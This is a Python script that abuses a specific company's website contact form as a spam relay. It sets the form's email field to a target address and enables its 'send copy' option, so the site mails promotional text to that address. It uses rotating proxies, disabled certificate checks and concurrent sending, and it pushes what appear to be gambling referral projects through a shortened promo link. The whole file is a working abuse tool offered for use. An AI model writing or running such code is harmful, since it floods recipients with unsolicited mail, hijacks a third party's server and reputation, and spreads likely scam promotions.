import requests

import module

headers = {
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
}


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response:
        text = self.get_text()
        data = {
            'name': text,
            'email': target,
            'message': text,
            'subject': text,
            'date': '29/12/2022',
            'send_copy': '1',
            'task': 'sendmail',
            'ctajax_modid': '144',
        }

        response = requests.post(
            'http://arabtechnique.com.sa/index.php/contact-us2',
            headers=headers,
            data=data,
            verify=False,
            proxies=self.get_proxies(),
            timeout=5
        )
        return response


if __name__ == '__main__':
    project_name = 'arabtechnique'
    success_message = 'Your email has been sent.'

    project = 'supercat'  # supercat luckybird allright fortuneclock
    promo_link = 'bit.ly/3Vvwzq1'
    spam = ConcreteSpam(
        project_name, success_message,
        referal_project_name=project,
        promo_link=promo_link
    )
    res = spam.send_post()
    if res:
        spam.run_concurrently()
